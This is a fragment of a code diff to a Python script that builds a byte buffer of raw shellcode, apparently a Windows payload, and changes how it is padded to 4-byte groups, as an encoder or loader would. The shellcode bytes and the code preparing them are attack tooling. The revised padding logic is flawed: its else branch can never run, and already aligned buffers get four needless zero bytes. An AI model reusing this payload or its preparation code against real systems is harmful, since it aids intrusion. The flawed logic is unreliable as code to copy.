@@ -46,8 +46,12 @@ buf += b"\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
 buf += b"\xf0\xb5\xa2\x56\xff\xd5"
 
 paddings = len(buf) % 4
-for i in range(paddings):
-    buf += b'\x00'
+if paddings < 4:
+    for i in range(4 - paddings):
+        buf += b'\x00'
+else:
+    for i in range(paddings):
+        buf += b'\x00'
 group = int(len(buf) / 4)
 buf_size = len(buf)
 
